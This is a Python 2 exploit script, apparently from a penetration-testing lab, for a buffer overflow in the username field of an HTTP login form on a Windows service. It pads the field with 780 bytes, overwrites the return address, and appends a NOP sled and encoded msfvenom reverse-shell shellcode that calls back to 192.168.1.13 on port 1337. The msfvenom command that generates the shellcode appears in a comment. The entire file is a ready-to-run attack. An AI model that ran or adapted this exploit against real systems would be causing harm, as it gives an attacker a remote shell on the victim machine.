#!/usr/bin/python
import socket
import sys

if (len(sys.argv) != 3):
    print "Usage: python " + sys.argv[0] + " <IP> <PORT>"
    sys.exit()
host = sys.argv[1]
port = sys.argv[2]

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.13 LPORT=1337 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
shellcode = ("\xd9\xea\xd9\x74\x24\xf4\xbb\x98\xce\xb2\x99\x58\x29\xc9\xb1"
"\x52\x31\x58\x17\x83\xe8\xfc\x03\xc0\xdd\x50\x6c\x0c\x09\x16"
"\x8f\xec\xca\x77\x19\x09\xfb\xb7\x7d\x5a\xac\x07\xf5\x0e\x41"
"\xe3\x5b\xba\xd2\x81\x73\xcd\x53\x2f\xa2\xe0\x64\x1c\x96\x63"
"\xe7\x5f\xcb\x43\xd6\xaf\x1e\x82\x1f\xcd\xd3\xd6\xc8\x99\x46"
"\xc6\x7d\xd7\x5a\x6d\xcd\xf9\xda\x92\x86\xf8\xcb\x05\x9c\xa2"
"\xcb\xa4\x71\xdf\x45\xbe\x96\xda\x1c\x35\x6c\x90\x9e\x9f\xbc"
"\x59\x0c\xde\x70\xa8\x4c\x27\xb6\x53\x3b\x51\xc4\xee\x3c\xa6"
"\xb6\x34\xc8\x3c\x10\xbe\x6a\x98\xa0\x13\xec\x6b\xae\xd8\x7a"
"\x33\xb3\xdf\xaf\x48\xcf\x54\x4e\x9e\x59\x2e\x75\x3a\x01\xf4"
"\x14\x1b\xef\x5b\x28\x7b\x50\x03\x8c\xf0\x7d\x50\xbd\x5b\xea"
"\x95\x8c\x63\xea\xb1\x87\x10\xd8\x1e\x3c\xbe\x50\xd6\x9a\x39"
"\x96\xcd\x5b\xd5\x69\xee\x9b\xfc\xad\xba\xcb\x96\x04\xc3\x87"
"\x66\xa8\x16\x07\x36\x06\xc9\xe8\xe6\xe6\xb9\x80\xec\xe8\xe6"
"\xb1\x0f\x23\x8f\x58\xea\xa4\x70\x34\xf5\x39\x19\x47\xf5\x44"
"\xe0\xce\x13\x2c\x02\x87\x8c\xd9\xbb\x82\x46\x7b\x43\x19\x23"
"\xbb\xcf\xae\xd4\x72\x38\xda\xc6\xe3\xc8\x91\xb4\xa2\xd7\x0f"
"\xd0\x29\x45\xd4\x20\x27\x76\x43\x77\x60\x48\x9a\x1d\x9c\xf3"
"\x34\x03\x5d\x65\x7e\x87\xba\x56\x81\x06\x4e\xe2\xa5\x18\x96"
"\xeb\xe1\x4c\x46\xba\xbf\x3a\x20\x14\x0e\x94\xfa\xcb\xd8\x70"
"\x7a\x20\xdb\x06\x83\x6d\xad\xe6\x32\xd8\xe8\x19\xfa\x8c\xfc"
"\x62\xe6\x2c\x02\xb9\xa2\x5d\x49\xe3\x83\xf5\x14\x76\x96\x9b"
"\xa6\xad\xd5\xa5\x24\x47\xa6\x51\x34\x22\xa3\x1e\xf2\xdf\xd9"
"\x0f\x97\xdf\x4e\x2f\xb2")     #size = 351
payload = 'A' * 780 + '\x83\x0C\x09\x10' + '\x90' * 16 + shellcode
content = "username=" + payload + "&password=test"
buff = "POST /login HTTP/1.1\r\n"
buff += "Host: 192.168.1.7\r\n"
buff += "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
buff += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buff += "Accept-Language: en-US,en;q=0.5\r\n"
buff += "Referer: http://192.168.1.7/login\r\n"
buff += "Connection: close\r\n"
buff += "Content-Type: application/x-www-form-urlencoded\r\n"
buff += "Content-Length: "+str(len(content))+"\r\n"
buff += "\r\n"
buff += content
print "Sending Evil Buffer...\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
s.send(buff)
s.close()
